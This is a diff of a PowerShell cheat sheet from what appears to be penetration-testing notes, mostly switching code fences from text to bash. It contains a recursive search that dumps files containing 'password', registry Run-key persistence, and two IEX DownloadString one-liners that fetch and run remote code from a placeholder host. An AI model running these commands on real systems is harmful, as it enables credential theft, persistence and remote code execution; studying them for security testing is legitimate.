@@ -437,7 +437,7 @@ There are many built-in aliases for the most commonly used cmdlets. The develope
 
 ## Check the Version of PowerShell
 
-```text
+```bash
 $PSVersionTable
 ```
 
@@ -504,7 +504,7 @@ You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Cop
 
 ### Adding a Folder to PATH
 
-```text
+```bash
 Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
 ```
 
@@ -516,7 +516,7 @@ In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in p
 {% tab title="Windows" %}
 To append `C:\Windows\Temp` to the PATH , use the following syntax \(note the \(`;`\) separator\):
 
-```text
+```bash
 $Env:PATH += ";C:\Windows\Temp"
 ```
 {% endtab %}
@@ -524,7 +524,7 @@ $Env:PATH += ";C:\Windows\Temp"
 {% tab title="Linux/MacOS" %}
 On Linux or MacOS, the colon \(`:`\) in the command separates each path in the list.
 
-```text
+```bash
 $Env:PATH += ":/temp"
 ```
 {% endtab %}
@@ -536,7 +536,7 @@ The **System.Environment** class provides **GetEnvironmentVariable** and **SetEn
 
 The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy
 
-```text
+```bash
 $path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
 $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
 ```
@@ -553,20 +553,20 @@ Get-ChildItem -Force
 
 This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.
 
-```text
+```bash
 $file = (Get-ChildItem $file_name) #can shorten command with gci, dir, or ls
 $file.attributes #Show the files attributes
-Normal
+# Normal
 
 #Flip the bit of the Hidden attribute
 $file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
 $file.attributes
-Hidden
+# Hidden
 
 #To remove the 'Hidden' attribute
 $file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
 $file.attributes
-Normal
+# Normal
 ```
 
 ### Recursively search for files that contain a certain string
@@ -575,13 +575,13 @@ Normal
 
 #### Shorthand \(aliased\) version:
 
-```text
+```bash
 ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
 ```
 
 Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`.
 
-```text
+```bash
 ls -R | ? { $_ | sls 'password' } | % { $_ ; gc $_ }
 ```
 
@@ -589,13 +589,13 @@ The above is expanded for visibility of the individual elements. The shorthand v
 
 #### Full version:
 
-```text
+```bash
 Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
 ```
 
 #### Explanation:
 
-```text
+```bash
 # Get a listing of all files within this folder and its subfolders.
 Get-ChildItem -Recurse |
 
@@ -626,7 +626,7 @@ Aside from the obvious use of aliases, collapsing of whitespace, and truncation 
 
 To add, edit, and modify registry keys. Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path \(popular persistence location!\), but any path can be substituted.
 
-```text
+```bash
 # add a new key to registry:
 New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name
 
@@ -650,7 +650,7 @@ The default paths to the executables for PowerShell and PowerShell ISE on releva
 When converting cmd.exe environment variables to PowerShell:
 
 ```text
-%SYSTEMROOT% = $env:SystemRoot
+%SYSTEMROOT% == $env:SystemRoot
 ```
 
 | Name | Location |
@@ -681,8 +681,8 @@ The default paths to the executables for PowerShell and PowerShell ISE on releva
 
 Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:
 
-```text
-powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
+```bash
+powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://$ip:$port/$file')"
 ```
 
 Can also use the example below to save the file to the local machine.
@@ -702,8 +702,8 @@ TODO: Expand and clean up PowerShell Bypass section. Link to Windows Privilege E
 * Check the PowerShell example below and see if the trailing `-` means something is missing
 * Link or add this information to Windows Privilege Escalation page
 
-```text
-Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
+```bash
+echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
 ```
 
 ### Silence PowerShell error messages
